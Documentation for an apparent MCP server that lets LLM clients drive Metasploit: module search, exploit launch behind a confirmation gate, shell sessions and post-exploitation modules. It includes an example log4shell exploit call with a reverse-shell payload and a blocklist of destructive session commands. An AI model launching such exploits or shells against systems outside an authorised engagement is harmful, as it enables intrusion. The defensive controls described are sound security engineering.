# Metasploit Integration

Raven Nest MCP provides six MCP tools that connect to a running Metasploit
Framework `msfrpcd` instance via MessagePack RPC over HTTPS.

This integration enables
- module search,
- exploit execution with a confirmation gate,
- auxiliary scanning,
- session management,
- post-exploitation.

All of it goes through the same MCP interface that the other pentesting
tools use.

The integration is ***disabled by default***. The operator must
- enable it explicitly,
- start `msfrpcd` separately,
- configure the connection credentials.

## Prerequisites

- **Metasploit Framework is installed**, from one of
  - a package manager,
  - the official installer,
  - Docker.
- **msfrpcd is available in `$PATH`**. It ships with Metasploit.
- **About 1 GB of RAM is free** for the msfrpcd process. It is Ruby-based
  and needs no GPU.
- **A Raven Nest MCP server is running**, which is `raven-server`.

## Quick Start

1. **Start msfrpcd**:

```sh
msfrpcd -P your-password -a 127.0.0.1 -p 55553 -n -f
```

**Flags:**
- `-P` sets the password,
- `-a` sets the bind address,
- `-p` sets the port,
- `-n` disables the database,
- `-f` keeps it in the foreground.

2. **Enable Metasploit** in `config/default.toml`:

```toml
[metasploit]
enabled = true
password = "your-password"
```

3. **Restart `raven-server`**. The six `msf_*` tools were already in the
   tool list, and they ***now accept calls***.

## Configuration Reference

All fields live under the `[metasploit]` section of `config/default.toml`.

The entire section is ***commented out by default***.

| Field | Type | Default | Description |
|---|---|---|---|
| `enabled` | bool | `false` | Master switch. The MSF tools are always listed, and every call is refused until this is `true`. |
| `host` | string | `"127.0.0.1"` | msfrpcd bind address. |
| `port` | u16 | `55553` | msfrpcd port. |
| `username` | string | `"msf"` | RPC username. |
| `password` | string | `"changeme"` | RPC password. **Change this.** |
| `ssl` | bool | `true` | Use HTTPS for the RPC connection (msfrpcd default). |
| `max_search_results` | usize | `20` | Maximum modules returned by `msf_search`. |
| `max_concurrent_exploits` | usize | `1` | Maximum simultaneous exploit executions. |
| `blocked_modules` | string[] | `[]` | Path-boundary patterns -- blocks exact matches, prefix matches (e.g. `exploit/windows/` blocks all Windows exploits), and path-segment matches. |
| `require_confirmation` | bool | `true` | Require double-call confirmation before exploit execution. |

### Example: Restrictive Setup

```toml
[metasploit]
enabled = true
host = "127.0.0.1"
port = 55553
username = "msf"
password = "strong-random-password"
ssl = true
max_search_results = 10
max_concurrent_exploits = 1
require_confirmation = true
blocked_modules = ["payload/", "exploit/windows/smb/ms17_010_eternalblue", "exploit/windows/smb/smb_doublepulsar_rce"]
```

## Workflow

The six tools are designed to be used in sequence:

```
msf_search  -->  msf_module_info  -->  msf_exploit / msf_auxiliary  -->  msf_sessions  -->  msf_post
```

1. **msf_search finds relevant modules** by keyword, CVE, platform or type.
2. **msf_module_info inspects a module before use**. It shows the module's
   - options,
   - references,
   - compatible payloads.
3. **msf_exploit or msf_auxiliary executes the module** against a target.
4. **msf_sessions works with the sessions that exploits created**. It can
   - list them,
   - interact with shells,
   - find compatible post modules.
5. **msf_post runs post-exploitation modules** on active sessions.

## Tool Reference

### msf_search

Search the Metasploit module database by keyword, CVE, platform or type.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `query` | string | yes | Search query (e.g. `cve:2021-44228`, `type:exploit smb`) |
| `limit` | number | no | Max results (default 20) |

**Example:**

```json
{
  "query": "type:exploit http log4shell",
  "limit": 5
}
```

**Output:**
A compact table with one row per module. Each row has
- the module path,
- the rank,
- a short description, ***truncated to 70 chars*** per module.

The output also shows the total count and how many are displayed.

---

### msf_module_info

Get detailed information about a specific module:
- its description,
- its required options,
- its CVE references,
- its compatible payloads, for exploits.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Full module path (e.g. `exploit/multi/http/log4shell_header_injection`) |

The module type is ***inferred from the path prefix***, which is one of
- `exploit/`,
- `auxiliary/`,
- `post/`.

**Example:**

```json
{
  "module": "exploit/multi/http/log4shell_header_injection"
}
```

**Output:**
- the module name,
- the rank,
- the description, truncated to 300 chars,
- up to 5 CVE/EDB references,
- the required options with their defaults,
- the top 5 compatible payloads, for exploits only.

---

### msf_exploit

Execute an exploit module against a target.

It is ***subject to the confirmation gate***, which is described under
Safety Model below.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Exploit module path (e.g. `exploit/multi/http/log4shell_header_injection`) |
| `target` | string | yes | Target host or IP |
| `port` | number | no | Target port (sets RPORT) |
| `payload` | string | no | Payload path (auto-selects if omitted) |
| `lhost` | string | no | LHOST for reverse payloads |
| `lport` | number | no | LPORT for reverse payloads (default 4444) |
| `options` | map&lt;string,string&gt; | no | Additional module options as key-value pairs |

**Example:**

```json
{
  "module": "exploit/multi/http/log4shell_header_injection",
  "target": "10.0.0.5",
  "port": 8080,
  "payload": "java/shell_reverse_tcp",
  "lhost": "10.0.0.1",
  "lport": 4444
}
```

**First call output, the confirmation:**

```
CONFIRM EXPLOIT:
  Module: exploit/multi/http/log4shell_header_injection
  Target: 10.0.0.5
  Port: 8080
  Payload: java/shell_reverse_tcp
Call msf_exploit again with identical parameters to execute.
```

**Second call output, the execution:**

```
Exploit launched (job 3, uuid abc123...)
Status: completed
{ ... result data ... }

Active sessions: 1
  Session 1: shell via exploit/multi/http/log4shell_header_injection
```

The handler polls for completion with exponential backoff, from 2s to 16s
and for ***up to 10 attempts***.

Result data is truncated to 2000 chars.

After polling, the handler checks for any new sessions and reports them. It
shows up to 3.

**Notes:**
- **The `options` map cannot override `RHOSTS`**. The validated `target`
  parameter is ***always used***.
- **The confirmation hash covers only `module`, `target`, `port` and
  `payload`**. Changing `lhost` or `lport`, or anything in `options`,
  between calls ***does not trigger re-confirmation***.

---

### msf_auxiliary

Run an auxiliary module. These are
- scanners,
- fuzzers,
- version detectors.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Auxiliary module path (e.g. `auxiliary/scanner/smb/smb_version`) |
| `target` | string | yes | Target host, IP, or CIDR |
| `port` | number | no | Target port (sets RPORT) |
| `options` | map&lt;string,string&gt; | no | Additional module options as key-value pairs |

**Example:**

```json
{
  "module": "auxiliary/scanner/smb/smb_version",
  "target": "10.0.0.0/24",
  "port": 445
}
```

**Output:**
- the module UUID,
- the completion status,
- the result data, truncated to 3000 chars.

The handler polls with exponential backoff, from 2s to 16s and for ***up to
10 attempts***.

**Note:**
The `options` map ***cannot override `RHOSTS`***. The validated `target`
parameter is always used.

---

### msf_sessions

Manage active Metasploit sessions. You can
- list them,
- interact with one,
- stop one,
- find compatible post-exploitation modules.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `action` | string | yes | One of: `list`, `interact`, `stop`, `compatible_modules` |
| `session_id` | number | no | Session ID (required for `interact`, `stop`, and `compatible_modules`) |
| `command` | string | no | Command to run in the session (required for `interact`) |

**Actions:**

- **list shows all active sessions**, each with its
  - type,
  - tunnel info,
  - platform.
- **interact writes a command to a shell session** and waits 2 seconds. It
  then reads the output, truncated to 4096 chars. The command is ***subject
  to the command blocklist***, which is described under Safety Model.
- **stop kills a session** by ID.
- **compatible_modules lists post-exploitation modules** compatible with a
  session, up to 20.

**Example for list:**

```json
{ "action": "list" }
```

```
2 active session(s):
  [1] meterpreter 10.0.0.5:54321 -> 10.0.0.1:4444 (linux)
  [2] shell 10.0.0.6:43210 -> 10.0.0.1:4445 (windows)
```

**Example for interact:**

```json
{
  "action": "interact",
  "session_id": 1,
  "command": "whoami"
}
```

---

### msf_post

Run a post-exploitation module on an active session.

| Parameter | Type | Required | Description |
|---|---|---|---|
| `module` | string | yes | Post module path (e.g. `post/multi/gather/env`) |
| `session_id` | number | yes | Session ID to run on |
| `options` | map&lt;string,string&gt; | no | Additional module options as key-value pairs |

**Example:**

```json
{
  "module": "post/multi/gather/env",
  "session_id": 1
}
```

**Output:**
- the module UUID,
- the completion status,
- the result data, truncated to 2000 chars.

The handler polls with exponential backoff, from 2s to 16s and for ***up to
8 attempts***.

## Safety Model

The Metasploit integration uses a 5-layer safety model.

Each layer is independent, and ***all must pass*** for an exploit to
execute.

### Layer 1: Disabled by Default

The `[metasploit]` section is commented out in the default config.

With `enabled = false`, or with the section left out, the six `msf_*` tools
are ***still listed to the client***, and any call to one returns an error:

> Metasploit is disabled. Set [metasploit] enabled = true in config.

### Layer 2: Target Validation and Scope

The tools that accept a `target` parameter are
- `msf_exploit`,
- `msf_auxiliary`.

Both pass it through `safety::validate_target()` ***before any RPC call***.

That is the same syntax check that nmap, nuclei and the other tools use.
When `[scope]` is enabled, it is also the same engagement scope check.

`msf_post` and `msf_sessions` act on existing sessions and take no target.

### Layer 3: Module Blocklist

The `blocked_modules` config field accepts module path patterns.

Before executing any module, the client checks the module path against
every pattern ***at path boundaries***. A pattern blocks the module with
that exact path and everything beneath it.

The check runs for every module type:
- exploit,
- auxiliary,
- post.

`exploit/foo` blocks `exploit/foo` and `exploit/foo/bar` and does not block
`exploit/foobar`.

The list is ***empty by default***.

If a pattern matches, execution is denied:

> module 'exploit/windows/smb/ms17_010_eternalblue' is blocked by config

Use this to block
- a whole tree with a trailing slash, such as `exploit/windows/`,
- one module by its full path.

A bare word such as `eternalblue` ***matches nothing***, because it is not a
path prefix.

### Layer 4: Confirmation Gate

When `require_confirmation = true`, which is the default, `msf_exploit`
requires the caller to ***submit identical parameters twice*** before
execution:

1. **The first call stores a pending confirmation**. The handler hashes the
   request, which is `module` + `target` + `port` + `payload`, and stores
   the hash. It returns a confirmation prompt showing ***exactly what will
   be executed***.
2. **The second call runs the exploit** if the hash matches the pending
   confirmation. The pending hash is then cleared.
3. **A second call with changed parameters replaces the pending hash**. That
   means a different module, target, port or payload. ***Execution does not
   proceed***.

The same caller makes both calls, so on its own this is ***not a human
approval step***.

It puts the plan in the transcript before anything runs, and a client that
asks before each tool call gives the operator the chance to stop it.

The confirmation gate applies only to `msf_exploit`, not to auxiliary or
post modules.

**Note:**
Only `module`, `target`, `port` and `payload` are hashed. `lhost` and
`lport` are ***not part of the confirmation hash***, and neither is
`options`.

### Layer 5: Session Command Blocklist

When `msf_sessions` interacts with a session, which is the call with
`action: "interact"`, the following command prefixes are ***always
blocked***:

| Prefix | Reason |
|---|---|
| `rm ` | File deletion |
| `del ` | File deletion (Windows) |
| `format ` | Disk formatting |
| `mkfs ` | Filesystem creation |
| `dd ` | Raw disk writes |
| `shutdown` | System shutdown |
| `reboot` | System reboot |
| `halt` | System halt |
| `poweroff` | System poweroff |
| `upload ` | File upload to target |

The check is case-insensitive and matches the start of the command string.

### Customising Safety

**Block specific modules:**

```toml
blocked_modules = ["exploit/windows/smb/ms17_010_eternalblue", "exploit/multi/", "payload/windows/x64/meterpreter"]
```

**Disable the confirmation gate:**
This is ***not recommended for LLM-driven use***.

```toml
require_confirmation = false
```

**Limit concurrency:**

```toml
max_concurrent_exploits = 1
```

## Security Considerations

- **Network exposure**. msfrpcd should bind ***only to `127.0.0.1`*** unless
  you need remote access. Never expose it to untrusted networks.
- **Credential management**. The default password `changeme` must be
  replaced before use. The server ***refuses to start*** with the default
  password when Metasploit is enabled. Passwords are redacted from error
  messages to prevent credential exposure in logs.
- **Self-signed TLS**. msfrpcd generates a self-signed certificate by
  default. The RPC client accepts invalid certificates ***only for localhost
  connections***, which are
  - `127.0.0.1`,
  - `localhost`,
  - `::1`.

  Remote msfrpcd connections require valid TLS certificates.
- **Module blocklist**. Use `blocked_modules` to prevent execution of
  dangerous or out-of-scope modules. Patterns match at path boundaries,
  ***not arbitrary substrings***. A boundary match is one of
  - an exact match,
  - a prefix with a `/` separator,
  - a trailing-slash prefix.
- **Confirmation gate**. Keep `require_confirmation = true` for any
  LLM-driven workflow. It makes the model state the plan before anything
  runs. It is ***not a human approval step***, because the same caller makes
  both calls. Use your MCP client's approval prompt for that.
- **Session isolation**. The command blocklist prevents destructive
  operations in sessions, but it is ***not a sandbox***. An attacker with
  shell access can bypass prefix-based filtering. Treat sessions as
  high-privilege access.
- **All request structs use `deny_unknown_fields`**. Any parameter name not
  listed in the tables above is ***rejected with a descriptive error***.
  This catches LLM parameter hallucination.

## Troubleshooting

### "Metasploit is disabled"

The MSF tools are listed, and every call is refused while Metasploit is
disabled.

Add `[metasploit]` with `enabled = true` to your config and ***restart
`raven-server`***.

### Connection refused / "msfrpcd not available"

msfrpcd is not running, or it is bound to a different address or port.

Start it:

```sh
msfrpcd -P your-password -a 127.0.0.1 -p 55553 -n -f
```

Verify it is listening:

```sh
ss -tlnp | grep 55553
```

### Invalid Authentication Token

The RPC token expired.

The client automatically re-authenticates ***once*** on token errors.

If this persists, restart msfrpcd. Long-running instances can accumulate
stale state.

### SSL Certificate Errors

msfrpcd generates a self-signed certificate by default.

The client accepts invalid certificates ***only for localhost
connections***.

For remote msfrpcd, provide a valid TLS certificate.

### Module Not Found

The Metasploit module database may be outdated.

Update it:

```sh
msfconsole -q -x "db_rebuild_cache; exit"
```

If you run `msfrpcd` without a database, with the `-n` flag, module search
***relies on filesystem scanning***.

In that case, bring your MSF installation up to date:

```sh
msfupdate
```

### Blocked Module Error

A module matched a pattern in `blocked_modules`.

Check your config, and remove or adjust the pattern if the module should be
allowed.

### Exploit Hangs / No Result

The exploit handler polls for ***about 2 minutes***. That is 10 attempts
with exponential backoff from 2s to 16s.

If the exploit takes longer, check `msf_sessions` for any sessions that were
created, or use `msf_auxiliary` to verify the target is reachable first.

### Auxiliary / Post Module Hangs

Auxiliary modules poll with the same backoff as exploits, for 10 attempts.

Post modules use a shorter window of 8 attempts.

If a module appears to hang, the target may be unresponsive, or the module
may require options that were not set. Use `msf_module_info` to check
required options.
